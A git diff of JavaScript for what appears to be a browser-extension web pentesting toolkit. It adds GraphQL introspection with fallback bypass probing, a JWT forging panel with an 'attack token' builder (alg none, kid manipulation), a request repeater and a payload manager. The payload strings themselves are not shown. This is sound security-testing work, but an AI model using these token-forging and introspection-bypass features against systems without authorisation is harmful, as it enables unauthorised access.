+        <span class="graphql-endpoint-label">${esc(url)} <span class="dim">(partial — __type probe)</span></span>
+        <button class="recon-copy-btn gql-dispatch-btn" data-action="gql-to-dispatch">&#8594; Dispatch</button>
+      </div>
+      ${section('Query Fields', typeData.fields?.length || 0, renderFields(typeData.fields || [], 'query'))}
+    `;
+    $('graphql-output').querySelectorAll('.graphql-section-header').forEach(h =>
+      h.addEventListener('click', () => h.closest('.graphql-section')?.classList.toggle('collapsed'))
+    );
+  }
+
+  async function introspect({ gqlOverride, bodyOverride, gql, body, rawBody, headers, nonIntrospection, statusLabel } = {}) {
+    const url = $('graphql-url')?.value?.trim();
+    if (!url) { toast('Enter endpoint URL first', 'error'); return; }
+    const output = $('graphql-output');
+    const gqlPayload = gqlOverride ?? gql;
+    const bodyPayload = bodyOverride ?? body;
+    const explicit = gqlPayload || bodyPayload || rawBody;
+    const method = $('graphql-method')?.value || 'POST';
+    const attempts = explicit
+      ? [{ label: statusLabel || 'custom introspection', gql: gqlPayload, body: bodyPayload, rawBody, headers, method, nonIntrospection }]
+      : [
+          ...AUTO_INTROSPECTION_ATTEMPTS.map(a => ({ ...a, method })),
+          ...(method === 'GET' ? [] : [{ label: 'GET query string', gql: INTROSPECTION_GQL, method: 'GET' }]),
+        ];
+    const errors = [];
+
+    for (const [idx, attempt] of attempts.entries()) {
+      output.innerHTML = `<div class="muted">${esc(statusLabel ?? `Running introspection (${idx + 1}/${attempts.length}): ${attempt.label}…`)}</div>`;
+      const parsed = parseGraphQLResponse(await runIntrospectFetch(url, attempt.gql, attempt.body, attempt.method, attempt.headers, attempt.rawBody));
+      if (parsed.error) { errors.push(`${attempt.label}: ${parsed.error}`); continue; }
+      const data = parsed.data;
+      if (attempt.nonIntrospection) {
+        const suggestions = parseSuggestionNames(data.errors);
+        renderSuggestionProbe(suggestions, url, data.errors || []);
+        return;
+      }
+      const schema = schemaFromData(data);
+      if (schema) {
+        if (idx > 0 && !explicit) toast(`Introspection worked via ${attempt.label}`, 'success');
+        renderSchema(schema, url);
+        return;
+      }
+      const typeProbe = typeProbeFromData(data);
+      if (typeProbe) {
+        if (idx > 0 && !explicit) toast(`Partial introspection worked via ${attempt.label}`, 'success');
+        renderTypeProbe(typeProbe, url);
+        return;
+      }
+      const errMsg = inferGraphQLError(data);
+      errors.push(`${attempt.label}: ${errMsg || 'No __schema in response'}`);
+      if (explicit) break;
+    }
+
+    const errMsg = errors.join('\n');
+    if (/introspection.*not allowed|__schema|__type|not allowed|disabled|Cannot query field/i.test(errMsg)) {
+      const parsed = parseGraphQLResponse(await runIntrospectFetch(url, null, BYPASSES.suggest.body, method));
+      if (parsed.data) {
+        const suggestions = parseSuggestionNames(parsed.data.errors);
+        if (suggestions.length) {
+          toast('Introspection blocked; showing validation suggestions', 'warn');
+          renderSuggestionProbe(suggestions, url, parsed.data.errors || []);
+          return;
+        }
+      }
+      showBypassOptions(output, errMsg);
+    } else {
+      output.innerHTML = `<div class="error-msg">GraphQL introspection failed:\n${esc(errMsg)}</div>`;
+    }
+  }
+
+  function renderSchema(schema, url) {
+    _currentUrl = url;
+    const output = $('graphql-output');
+    _types = schema.types.filter(t =>
+      !t.name.startsWith('__') && !['String','Boolean','Int','Float','ID'].includes(t.name)
+    );
+    const userTypes = _types;
+    const findType = name => userTypes.find(t => t.name === name);
+    const queryT = findType(schema.queryType?.name);
+    const mutT   = schema.mutationType ? findType(schema.mutationType.name) : null;
+    const subT   = schema.subscriptionType ? findType(schema.subscriptionType.name) : null;
+    const rootNames = new Set([schema.queryType?.name, schema.mutationType?.name, schema.subscriptionType?.name].filter(Boolean));
+    const objectTypes = userTypes.filter(t => t.kind === 'OBJECT'    && !rootNames.has(t.name));
+    const inputTypes  = userTypes.filter(t => t.kind === 'INPUT_OBJECT');
+    const enumTypes   = userTypes.filter(t => t.kind === 'ENUM');
+    const scalarTypes = userTypes.filter(t => t.kind === 'SCALAR');
+
+    function typeListSection(title, types, bodyFn) {
+      if (!types.length) return '';
+      return section(title, types.length, types.map(t =>
+        `<div class="graphql-type-entry" data-tname="${esc(t.name.toLowerCase())}"><div class="graphql-type-name">${esc(t.name)}</div>${bodyFn(t)}</div>`
+      ).join(''));
+    }
+
+    output.innerHTML = `
+      <div class="graphql-header">
+        <span class="graphql-endpoint-label">${esc(url)}</span>
+        <button id="graphql-copy-schema" class="recon-copy-btn">Copy JSON</button>
+        <button id="graphql-copy-sdl" class="recon-copy-btn">Copy SDL</button>
+        <button class="recon-copy-btn gql-dispatch-btn" data-action="gql-to-dispatch">&#8594; Dispatch</button>
+      </div>
+      ${queryT ? section('Queries', queryT.fields?.length || 0, renderFields(queryT.fields, 'query')) : ''}
+      ${mutT   ? section('Mutations', mutT.fields?.length || 0, renderFields(mutT.fields, 'mutation'), ' graphql-mutations') : ''}
+      ${subT   ? section('Subscriptions', subT.fields?.length || 0,
+          renderFields(subT.fields) + '<div class="graphql-ws-note dim">WebSocket subscriptions cannot be tested via Dispatch</div>') : ''}
+      ${typeListSection('Object Types', objectTypes, t => renderFields(t.fields))}
+      ${typeListSection('Input Types', inputTypes, t => {
+        if (!t.inputFields?.length) return '<div class="graphql-field dim">No fields</div>';
+        return t.inputFields.map(f =>
+          `<div class="graphql-field"><span class="graphql-fname">${esc(f.name)}</span><span class="graphql-ftype">${esc(typeStr(f.type))}</span></div>`
+        ).join('');
+      })}
+      ${typeListSection('Enums', enumTypes, t =>
+        `<div class="graphql-enum-values">${(t.enumValues||[]).map(v => `<span class="graphql-enum-val${v.isDeprecated?' deprecated':''}">${esc(v.name)}</span>`).join('')}</div>`
+      )}
+      ${scalarTypes.length ? section('Scalars', scalarTypes.length,
+        `<div class="graphql-enum-values">${scalarTypes.map(t => `<span class="graphql-enum-val">${esc(t.name)}</span>`).join('')}</div>`
+      ) : ''}
+    `;
+
+    $('graphql-copy-schema')?.addEventListener('click', () => {
+      copyText(JSON.stringify(schema, null, 2));
+      toast('Schema JSON copied', 'success');
+    });
+    $('graphql-copy-sdl')?.addEventListener('click', () => {
+      copyText(schemaToSDL(schema));
+      toast('SDL copied', 'success');
+    });
+
+    document.querySelectorAll('#graphql-output .graphql-section-header').forEach(h => {
+      h.addEventListener('click', () => h.closest('.graphql-section')?.classList.toggle('collapsed'));
+    });
+
+    const searchBar = $('graphql-search-bar');
+    if (searchBar) {
+      searchBar.classList.remove('hidden');
+      $('graphql-schema-search').value = '';
+    }
+    saveGqlUrlHistory(url);
+  }
+
+  function schemaToSDL(schema) {
+    const BUILT_IN = new Set(['String', 'Boolean', 'Int', 'Float', 'ID']);
+    const types = (schema.types || []).filter(t => !BUILT_IN.has(t.name) && !t.name.startsWith('__'));
+
+    function typeRefSDL(t) {
+      if (!t) return 'Unknown';
+      if (t.kind === 'NON_NULL') return typeRefSDL(t.ofType) + '!';
+      if (t.kind === 'LIST') return '[' + typeRefSDL(t.ofType) + ']';
+      return t.name || 'Unknown';
+    }
+
+    function fieldSDL(f, indent = '  ') {
+      const args = f.args?.length ? `(${f.args.map(a => `${a.name}: ${typeRefSDL(a.type)}`).join(', ')})` : '';
+      const dep = f.isDeprecated ? ' @deprecated' : '';
+      const desc = f.description ? `${indent}"""${f.description}"""\n` : '';
+      return `${desc}${indent}${f.name}${args}: ${typeRefSDL(f.type)}${dep}`;
+    }
+
+    const parts = [];
+    const qn = schema.queryType?.name, mn = schema.mutationType?.name, sn = schema.subscriptionType?.name;
+    if ((qn && qn !== 'Query') || (mn && mn !== 'Mutation') || (sn && sn !== 'Subscription')) {
+      let sd = 'schema {';
+      if (qn) sd += `\n  query: ${qn}`;
+      if (mn) sd += `\n  mutation: ${mn}`;
+      if (sn) sd += `\n  subscription: ${sn}`;
+      parts.push(sd + '\n}');
+    }
+
+    for (const t of types) {
+      const desc = t.description ? `"""\n${t.description}\n"""\n` : '';
+      let block = desc;
+      switch (t.kind) {
+        case 'SCALAR':
+          block += `scalar ${t.name}`;
+          break;
+        case 'ENUM':
+          block += `enum ${t.name} {\n`;
+          block += (t.enumValues || []).map(v => `  ${v.name}${v.isDeprecated ? ' @deprecated' : ''}`).join('\n');
+          block += '\n}';
+          break;
+        case 'INPUT_OBJECT':
+          block += `input ${t.name} {\n`;
+          block += (t.inputFields || []).map(f => `  ${f.name}: ${typeRefSDL(f.type)}`).join('\n');
+          block += '\n}';
+          break;
+        case 'INTERFACE':
+          block += `interface ${t.name} {\n${(t.fields || []).map(f => fieldSDL(f)).join('\n')}\n}`;
+          break;
+        case 'UNION':
+          block += `union ${t.name} = ${(t.possibleTypes || []).map(p => p.name).join(' | ')}`;
+          break;
+        case 'OBJECT': {
+          const impl = t.interfaces?.length ? ` implements ${t.interfaces.map(i => i.name).join(' & ')}` : '';
+          block += `type ${t.name}${impl} {\n${(t.fields || []).map(f => fieldSDL(f)).join('\n')}\n}`;
+          break;
+        }
+        default: block = '';
+      }
+      if (block) parts.push(block);
+    }
+    return parts.join('\n\n');
+  }
+
+  function applySchemaSearch(q) {
+    const term = q.toLowerCase();
+    document.querySelectorAll('#graphql-output .graphql-section').forEach(sec => {
+      let sectionHit = false;
+      sec.querySelectorAll(':scope > .graphql-section-body > .graphql-field').forEach(el => {
+        const match = !term || (el.dataset.fname || '').includes(term);
+        el.style.display = match ? '' : 'none';
+        if (match) sectionHit = true;
+      });
+      sec.querySelectorAll('.graphql-type-entry').forEach(entry => {
+        const typeMatch = !term || (entry.dataset.tname || '').includes(term);
+        let fieldHit = false;
+        entry.querySelectorAll('.graphql-field').forEach(el => {
+          const match = !term || typeMatch || (el.dataset.fname || '').includes(term);
+          el.style.display = match ? '' : 'none';
+          if (!term || (el.dataset.fname || '').includes(term)) fieldHit = true;
+        });
+        entry.querySelectorAll('.graphql-enum-val').forEach(el => {
+          const match = !term || typeMatch || el.textContent.toLowerCase().includes(term);
+          el.style.display = match ? '' : 'none';
+          if (match) fieldHit = true;
+        });
+        const entryVisible = !term || typeMatch || fieldHit;
+        entry.style.display = entryVisible ? '' : 'none';
+        if (entryVisible) sectionHit = true;
+      });
+      sec.style.display = sectionHit || !term ? '' : 'none';
+    });
+  }
+
+  async function saveGqlUrlHistory(url) {
+    if (!url) return;
+    const { gqlUrlHistory = [] } = await chrome.storage.local.get('gqlUrlHistory');
+    const updated = [url, ...gqlUrlHistory.filter(u => u !== url)].slice(0, 10);
+    await chrome.storage.local.set({ gqlUrlHistory: updated });
+    loadGqlUrlHistory();
+  }
+
+  function loadGqlUrlHistory() {
+    chrome.storage.local.get('gqlUrlHistory', ({ gqlUrlHistory = [] }) => {
+      const dl = $('graphql-url-history');
+      if (dl) dl.innerHTML = gqlUrlHistory.map(u => `<option value="${esc(u)}">`).join('');
+    });
+  }
+
+  function clear() {
+    _endpoints = [];
+    _endpointDetails = new Map();
+    const out = $('graphql-output');
+    const urlInput = $('graphql-url');
+    const searchBar = $('graphql-search-bar');
+    if (out) out.innerHTML = '<div class="muted" id="graphql-empty">Detect GraphQL endpoints from the current page, then run introspection to explore the schema.</div>';
+    if (urlInput) urlInput.value = '';
+    if (searchBar) { searchBar.classList.add('hidden'); $('graphql-schema-search').value = ''; }
+  }
+
+  return { detect, introspect, clear, sendToDispatch: (url, body) => sendToDispatch(url, body), getCurrentUrl: () => _currentUrl, getBypasses: () => BYPASSES, loadGqlUrlHistory, applySchemaSearch };
+})();
+
+// ─── Find bar ─────────────────────────────────────────────────────────────────
+
+const FindBar = (() => {
+  let _matches = [];
+  let _current = -1;
+  let _hlAll    = null;
+  let _hlCur    = null;
+  let _visible  = false;
+
+  function init() {
+    if (CSS?.highlights) {
+      _hlAll = new Highlight();
+      _hlCur = new Highlight();
+      CSS.highlights.set('find-results', _hlAll);
+      CSS.highlights.set('find-current', _hlCur);
+    }
+
+    document.addEventListener('keydown', e => {
+      if ((e.metaKey || e.ctrlKey) && e.key === 'f') {
+        e.preventDefault();
+        show();
+      } else if (e.key === 'Escape' && _visible) {
+        e.preventDefault();
+        hide();
+      }
+    });
+
+    $('find-bar-input').addEventListener('input', () => search($('find-bar-input').value));
+    $('find-bar-input').addEventListener('keydown', e => {
+      if (e.key === 'Enter') { e.preventDefault(); e.shiftKey ? step(-1) : step(1); }
+    });
+    $('find-bar-next').addEventListener('click',  () => step(1));
+    $('find-bar-prev').addEventListener('click',  () => step(-1));
+    $('find-bar-close').addEventListener('click', () => hide());
+  }
+
+  function show() {
+    $('find-bar').classList.remove('hidden');
+    $('find-bar-input').focus();
+    $('find-bar-input').select();
+    _visible = true;
+    search($('find-bar-input').value);
+  }
+
+  function hide() {
+    $('find-bar').classList.add('hidden');
+    _visible = false;
+    clear();
+  }
+
+  function clear() {
+    _matches = [];
+    _current = -1;
+    _hlAll?.clear();
+    _hlCur?.clear();
+    $('find-count').textContent = '';
+    $('find-bar-input').classList.remove('find-no-results');
+  }
+
+  function search(q) {
+    clear();
+    if (!q) return;
+    const scope = document.querySelector('.tab-pane.active') || document.body;
+    const term  = q.toLowerCase();
+    const walker = document.createTreeWalker(scope, NodeFilter.SHOW_TEXT, {
+      acceptNode(node) {
+        const p = node.parentElement;
+        if (!p) return NodeFilter.FILTER_REJECT;
+        if (['SCRIPT', 'STYLE', 'NOSCRIPT', 'TEXTAREA', 'INPUT'].includes(p.tagName))
+          return NodeFilter.FILTER_REJECT;
+        if (p.closest('.hidden, [style*="display: none"], [style*="display:none"]'))
+          return NodeFilter.FILTER_REJECT;
+        return NodeFilter.FILTER_ACCEPT;
+      },
+    });
+
+    let node;
+    while ((node = walker.nextNode())) {
+      const text = node.textContent.toLowerCase();
+      let idx = 0;
+      while ((idx = text.indexOf(term, idx)) !== -1) {
+        const r = new Range();
+        r.setStart(node, idx);
+        r.setEnd(node, idx + q.length);
+        _matches.push(r);
+        _hlAll?.add(r);
+        idx += term.length;
+      }
+    }
+
+    if (_matches.length) {
+      _current = 0;
+      updateCurrent();
+    } else {
+      $('find-bar-input').classList.add('find-no-results');
+      updateCount();
+    }
+  }
+
+  function step(dir) {
+    if (!_matches.length) return;
+    _current = (_current + dir + _matches.length) % _matches.length;
+    updateCurrent();
+  }
+
+  function updateCurrent() {
+    _hlCur?.clear();
+    if (_current < 0 || !_matches[_current]) return;
+    _hlCur?.add(_matches[_current]);
+    _matches[_current].startContainer.parentElement
+      ?.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+    updateCount();
+  }
+
+  function updateCount() {
+    $('find-count').textContent = _matches.length
+      ? `${_current + 1} / ${_matches.length}`
+      : ($('find-bar-input').value ? 'No results' : '');
+  }
+
+  return { init };
+})();
+
 // ─── Wire-up ──────────────────────────────────────────────────────────────────
 
 document.addEventListener('DOMContentLoaded', async () => {
   initTabs();
+  FindBar.init();
 
   // ── Cookies ──
   $('cookies-refresh').addEventListener('click', () => Cookies.load());
@@ -2725,9 +4891,8 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   // Auto-load when switching to storage tab
   document.querySelector('.nav-btn[data-tab="storage"]').addEventListener('click', async () => {
+    await Storage.load();
     Storage.switchView(state.storageView);
-    if (state.storageView === 'local') await Storage.loadLocal();
-    else await Storage.loadSession();
   });
 
   const storageClick = e => {
@@ -2780,7 +4945,9 @@ document.addEventListener('DOMContentLoaded', async () => {
   });
 
   $('jwt-alg').addEventListener('change', () => {
-    $('jwt-secret-wrap').style.display = $('jwt-alg').value.toLowerCase() === 'none' ? 'none' : '';
+    const alg = $('jwt-alg').value.toLowerCase();
+    $('jwt-secret-wrap').style.display = alg === 'none' ? 'none' : '';
+    $('jwt-secret').placeholder = 'HMAC secret';
   });
 
   $('jwt-sign-btn').addEventListener('click', async () => {
@@ -2793,8 +4960,8 @@ document.addEventListener('DOMContentLoaded', async () => {
         token = JWT.signNone(header, payload, alg);
       } else {
         const secret = $('jwt-secret').value;
-        if (!secret) { toast('Secret required for HS256', 'error'); return; }
-        token = await JWT.signHS256(header, payload, secret);
+        if (!secret) { toast('Secret / key required', 'error'); return; }
+        token = await JWT.sign(header, payload, secret, alg);
       }
       $('jwt-output').value = token;
       toast('Token forged', 'success');
@@ -2808,9 +4975,26 @@ document.addEventListener('DOMContentLoaded', async () => {
       if (!secret) { toast('Secret required for verify', 'error'); return; }
       const ok = await JWT.verifyHS256(token, secret);
       const el = $('jwt-verify-result');
-      el.textContent = ok ? '✓ Signature valid' : '✗ Signature invalid';
+      el.textContent = ok ? 'Signature valid' : 'Signature invalid';
       el.className = ok ? 'ok' : 'bad';
       el.classList.remove('hidden');
+    } catch (e) { toast(String(e), 'error'); }
+  });
+
+  $('jwt-attack-apply').addEventListener('click', async () => {
+    try {
+      const header = JSON.parse($('jwt-header').value);
+      const payload = JSON.parse($('jwt-payload').value);
+      const token = await JWT.buildAttackToken($('jwt-attack-type').value, header, payload, {
+        kid: $('jwt-attack-kid').value.trim(),
+        material: $('jwt-attack-material').value,
+        alg: $('jwt-alg').value,
+      });
+      $('jwt-output').value = token;
+      const decoded = JWT.decode(token);
+      $('jwt-header').value = JSON.stringify(decoded.header, null, 2);
+      $('jwt-payload').value = JSON.stringify(decoded.payload, null, 2);
+      toast('Attack token built', 'success');
     } catch (e) { toast(String(e), 'error'); }
   });
 
@@ -2827,27 +5011,66 @@ document.addEventListener('DOMContentLoaded', async () => {
   $('jwt-to-cookie-btn').addEventListener('click', jwtSendToCookie);
 
   // ── Recon ──
-  $('recon-forms').addEventListener('click',  () => Recon.forms());
-  $('recon-links').addEventListener('click',  () => Recon.links());
-  $('recon-tech').addEventListener('click',   () => Recon.techStack());
-  $('recon-hidden').addEventListener('click', () => Recon.hiddenFields());
-  $('recon-source').addEventListener('click',  () => Recon.sourceScan());
-  $('recon-secrets').addEventListener('click', () => Recon.secrets());
-  $('recon-domxss').addEventListener('click',       () => Recon.domXSS());
-  $('recon-storage-scan').addEventListener('click', () => Recon.storageScan());
-  $('recon-run-all').addEventListener('click',      () => Recon.runAll());
+  initReconPlaceholders();
+  $('recon-run-all').addEventListener('click', () => Recon.runAll());
   $('recon-copy-all').addEventListener('click', () => {
     const md = allReconToMarkdown();
     if (!md) { toast('Nothing to copy', 'warn'); return; }
     copyText(md);
     toast('All recon copied as Markdown', 'success');
   });
-  $('recon-clear').addEventListener('click',   () => { $('recon-output').innerHTML = ''; });
+  $('recon-export-md').addEventListener('click', () => {
+    const md = allReconToMarkdown();
+    if (!md) { toast('Nothing to export', 'warn'); return; }
+    downloadText(`spectre-recon-${Date.now()}.md`, md, 'text/markdown');
+    toast('Recon Markdown exported', 'success');
+  });
+  $('recon-export-json').addEventListener('click', () => {
+    const data = reconToJson();
+    if (!data.sections.length) { toast('Nothing to export', 'warn'); return; }
+    downloadText(`spectre-recon-${Date.now()}.json`, JSON.stringify(data, null, 2), 'application/json');
+    toast('Recon JSON exported', 'success');
+  });
+  $('recon-collapse-all').addEventListener('click', () => {
+    const sections = Array.from($$('#recon-output .recon-section'));
+    const anyExpanded = sections.some(s => !s.classList.contains('recon-section-collapsed'));
+    sections.forEach(s => s.classList.toggle('recon-section-collapsed', anyExpanded));
+    $('recon-collapse-all').textContent = anyExpanded ? 'Expand All' : 'Collapse All';
+  });
+  $('recon-clear').addEventListener('click', () => {
+    $('recon-output').innerHTML = '';
+    $('recon-collapse-all').textContent = 'Collapse All';
+    initReconPlaceholders();
+  });
   $('recon-output').addEventListener('click', e => {
     const secretsCopy = e.target.closest('[data-action="secrets-copy"]');
     if (secretsCopy) {
       copyText(secretsCopy.dataset.val);
       toast('Copied', 'success');
+      return;
+    }
+
+    const rerunBtn = e.target.closest('[data-action="recon-rerun"]');
+    if (rerunBtn) {
+      RECON_RERUN_MAP[rerunBtn.dataset.check]?.();
+      return;
+    }
+
+    const spiderGroup = e.target.closest('[data-action="spider-group"]');
+    if (spiderGroup) {
+      Recon.spiderGroupBy = spiderGroup.dataset.group;
+      if (Recon.spiderCache) Recon.renderSpiderFromCache();
+      else Recon.links();
+      return;
+    }
+
+    const spiderDetails = e.target.closest('[data-action="spider-toggle-details"]');
+    if (spiderDetails) {
+      const line = spiderDetails.closest('.recon-spider-line');
+      const loc = line?.querySelector('.recon-spider-loc');
+      if (!loc) return;
+      const hidden = loc.classList.toggle('hidden');
+      spiderDetails.textContent = hidden ? 'Details' : 'Hide';
       return;
     }
 
@@ -2861,20 +5084,32 @@ document.addEventListener('DOMContentLoaded', async () => {
       return;
     }
 
+    const spiderRepeat = e.target.closest('[data-action="spider-send-repeater"]');
+    if (spiderRepeat) {
+      $('dispatch-url').value = spiderRepeat.dataset.url;
+      $('dispatch-method').value = 'GET';
+      activateTab('dispatch');
+      toast('URL sent to Dispatch', 'success');
+      return;
+    }
+
     const toggleBtn = e.target.closest('[data-action="recon-section-toggle"]');
     if (toggleBtn) {
-      const section = toggleBtn.closest('.recon-section');
-      const body = section?.querySelector('.recon-section-body');
-      if (body) {
-        const collapsed = body.classList.toggle('hidden');
-        section.classList.toggle('recon-section-collapsed', collapsed);
-      }
+      toggleBtn.closest('.recon-section')?.classList.toggle('recon-section-collapsed');
+      const anyExp = Array.from($$('#recon-output .recon-section')).some(s => !s.classList.contains('recon-section-collapsed'));
+      $('recon-collapse-all').textContent = anyExp ? 'Collapse All' : 'Expand All';
       return;
     }
 
     const scrollLink = e.target.closest('[data-scroll-to]');
     if (scrollLink) {
-      document.getElementById(scrollLink.dataset.scrollTo)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      const target = document.getElementById(scrollLink.dataset.scrollTo);
+      if (target) {
+        target.classList.remove('recon-section-collapsed');
+        const anyExp = Array.from($$('#recon-output .recon-section')).some(s => !s.classList.contains('recon-section-collapsed'));
+        $('recon-collapse-all').textContent = anyExp ? 'Collapse All' : 'Expand All';
+        scrollContentToElement(target);
+      }
       return;
     }
 
@@ -2885,6 +5120,21 @@ document.addEventListener('DOMContentLoaded', async () => {
     wrap.classList.toggle('collapsed');
     const btn = wrap.querySelector('.collapse-btn');
     // icon handled by CSS ::after based on .collapsed class
+  });
+
+  // ── Dispatch ──
+  $('dispatch-load-current').addEventListener('click', () => Dispatch.loadCurrent());
+  $('dispatch-send').addEventListener('click', () => Dispatch.send());
+  $('dispatch-copy-curl').addEventListener('click', () => { copyText(Dispatch.buildCurl()); toast('curl copied', 'success'); });
+  $('dispatch-clear').addEventListener('click', () => Dispatch.clear());
+  $('dispatch-url').addEventListener('keydown', e => { if (e.key === 'Enter') Dispatch.send(); });
+  $('tab-dispatch').addEventListener('click', e => {
+    const tab = e.target.closest('.dispatch-tab-btn');
+    if (!tab) return;
+    $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
+    tab.classList.add('active');
+    $('dispatch-headers').classList.toggle('hidden', tab.dataset.pane !== 'headers');
+    $('dispatch-body').classList.toggle('hidden', tab.dataset.pane !== 'body');
   });
 
   // ── Auth ──
@@ -2983,6 +5233,57 @@ document.addEventListener('DOMContentLoaded', async () => {
     $('encode-input').value = $('encode-output').value = '';
   });
 
+  // ── Timestamp ──
+  $('ts-parse-btn').addEventListener('click', () => Timestamp.render(Timestamp.parse($('ts-input').value)));
+  $('ts-now-btn').addEventListener('click', () => {
+    $('ts-input').value = Math.floor(Date.now() / 1000);
+    Timestamp.render(new Date());
+  });
+  $('ts-input').addEventListener('keydown', e => {
+    if (e.key === 'Enter') Timestamp.render(Timestamp.parse($('ts-input').value));
+  });
+  $('ts-output').addEventListener('click', e => {
+    const btn = e.target.closest('.ts-copy-btn');
+    if (!btn) return;
+    copyText(btn.dataset.val);
+    toast('Copied', 'success');
+  });
+
+  // ── Diff ──
+  $('diff-btn').addEventListener('click', () => Diff.run());
+  $('diff-clear-btn').addEventListener('click', () => Diff.clear());
+
+  // ── Curl import ──
+  $('dispatch-import-curl').addEventListener('click', () => {
+    $('curl-import-panel').classList.toggle('hidden');
+  });
+  $('curl-import-cancel').addEventListener('click', () => {
+    $('curl-import-panel').classList.add('hidden');
+    $('curl-import-input').value = '';
+  });
+  $('curl-import-load').addEventListener('click', () => {
+    const raw = $('curl-import-input').value.trim();
+    if (!raw) return;
+    try {
+      const { method, url, headers, body } = parseCurlCommand(raw);
+      if (url) $('dispatch-url').value = url;
+      if (method) $('dispatch-method').value = method;
+      $('dispatch-headers').value = Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\n');
+      $('dispatch-body').value = body || '';
+      if (body) {
+        $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelector('#tab-dispatch .dispatch-tab-btn[data-pane="body"]')?.classList.add('active');
+        $('dispatch-headers').classList.add('hidden');
+        $('dispatch-body').classList.remove('hidden');
+      }
+      $('curl-import-panel').classList.add('hidden');
+      $('curl-import-input').value = '';
+      toast('curl loaded', 'success');
+    } catch (e) {
+      toast(`Parse error: ${e.message}`, 'error');
+    }
+  });
+
   $('hash-btn').addEventListener('click', async () => {
     const type  = $('hash-type').value;
     const input = $('hash-input').value;
@@ -3007,25 +5308,154 @@ document.addEventListener('DOMContentLoaded', async () => {
   }));
 
   // ── Payloads ──
+  await Payloads.loadCustom();
   document.querySelector('.nav-btn[data-tab="payloads"]').addEventListener('click', () => Payloads.render());
   $('payload-search').addEventListener('input', e => { Payloads.filter = e.target.value; Payloads.render(); });
   $('payload-search-clear').addEventListener('click', () => { $('payload-search').value = ''; Payloads.filter = ''; Payloads.render(); });
-  $('payload-output').addEventListener('contextmenu', e => {
+  $('payload-custom-save').addEventListener('click', () => Payloads.saveCustom());
+  $('payload-custom-list').addEventListener('click', e => {
+    const edit = e.target.closest('[data-action="payload-edit-custom"]');
+    if (edit) {
+      const group = state.customPayloadCats.find(c => c.id === +edit.dataset.id);
+      if (group) {
+        $('payload-custom-name').value = group.cat;
+        $('payload-custom-values').value = group.payloads.join('\n');
+        document.querySelector('.payload-custom-editor')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+      return;
+    }
+    const del = e.target.closest('[data-action="payload-delete-custom"]');
+    if (del) Payloads.deleteCustom(+del.dataset.id);
+  });
+  $('payload-output').addEventListener('click', e => {
+	    const copyAll = e.target.closest('.payload-copy-all');
+	    if (copyAll) {
+	      const cat = Payloads.allCats()[parseInt(copyAll.dataset.idx)];
+	      if (cat) {
+	        const rows = Payloads.orderedRows(cat.cat, [
+	          ...(cat.payloads || []).map(value => ({ value })),
+	          ...(cat.customPayloads || []).map(value => ({ value })),
+	        ]);
+	        copyText(rows.map(r => Payloads.displayValue(cat.cat, r.value)).join('\n'));
+	        toast('Copied all', 'success');
+	      }
+	      return;
+	    }
+	    const gqlMethod = e.target.closest('[data-action="payload-graphql-method"]');
+	    if (gqlMethod) {
+	      state.payloadGraphQLMethod = gqlMethod.dataset.method === 'GET' ? 'GET' : 'POST';
+	      Payloads.render();
+	      return;
+	    }
+    const addPayload = e.target.closest('.payload-add-btn');
+    if (addPayload) {
+      const wrap = addPayload.closest('.payload-add-row');
+      const input = wrap?.querySelector('.payload-add-input');
+      Payloads.addToGroup(addPayload.dataset.cat, input?.value || '');
+      return;
+    }
+    const deleteOne = e.target.closest('.payload-delete-one');
+    if (deleteOne) { Payloads.deletePayload(deleteOne.dataset.cat, +deleteOne.dataset.customIdx); return; }
+    const copyOne = e.target.closest('.payload-copy-one');
+    if (copyOne) { copyText(copyOne.dataset.val); toast('Copied', 'success'); return; }
+    const copyUrlEncoded = e.target.closest('.payload-copy-urlencoded');
+    if (copyUrlEncoded) { copyText(encodeURIComponent(copyUrlEncoded.dataset.val)); toast('Copied URL encoded', 'success'); return; }
+    const sendEncode = e.target.closest('.payload-send-encode');
+    if (sendEncode) {
+      activateTab('tools');
+      $('encode-input').value = sendEncode.dataset.val;
+      $('encode-output').value = '';
+      document.getElementById('tools-encode')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      toast('Payload sent to Encode / Decode', 'success');
+      return;
+    }
+  });
+  $('payload-output').addEventListener('keydown', e => {
+    if (e.key !== 'Enter') return;
+    const input = e.target.closest('.payload-add-input');
+    if (!input) return;
+    e.preventDefault();
+    Payloads.addToGroup(input.dataset.cat, input.value);
+  });
+  $('payload-output').addEventListener('dragstart', e => {
+    const row = e.target.closest('.payload-row');
+    if (!row) return;
+    row.classList.add('dragging');
+    e.dataTransfer.effectAllowed = 'move';
+    e.dataTransfer.setData('application/x-spectre-payload', JSON.stringify({
+      cat: row.dataset.cat,
+      value: row.dataset.val,
+    }));
+  });
+  $('payload-output').addEventListener('dragend', e => {
+    e.target.closest('.payload-row')?.classList.remove('dragging');
+    $$('.payload-row.drag-over').forEach(row => row.classList.remove('drag-over'));
+  });
+  $('payload-output').addEventListener('dragover', e => {
     const row = e.target.closest('.payload-row');
     if (!row) return;
     e.preventDefault();
-    const text = row.querySelector('.payload-text')?.textContent ?? '';
-    showCtxMenu(e.clientX, e.clientY, { kind: 'payload', value: text, canSendEncode: true, canSendJwt: false, canCopyUrlEncoded: true });
+    e.dataTransfer.dropEffect = 'move';
+    $$('.payload-row.drag-over').forEach(el => { if (el !== row) el.classList.remove('drag-over'); });
+    row.classList.add('drag-over');
   });
-  $('payload-output').addEventListener('click', e => {
-    const copyAll = e.target.closest('.payload-copy-all');
-    if (copyAll) {
-      const cat = PAYLOAD_CATS[parseInt(copyAll.dataset.idx)];
-      if (cat) { copyText(cat.payloads.join('\n')); toast('Copied all', 'success'); }
+  $('payload-output').addEventListener('dragleave', e => {
+    e.target.closest('.payload-row')?.classList.remove('drag-over');
+  });
+  $('payload-output').addEventListener('drop', e => {
+    const target = e.target.closest('.payload-row');
+    if (!target) return;
+    e.preventDefault();
+    target.classList.remove('drag-over');
+    let dragged = null;
+    try { dragged = JSON.parse(e.dataTransfer.getData('application/x-spectre-payload')); } catch {}
+    if (!dragged || dragged.cat !== target.dataset.cat) return;
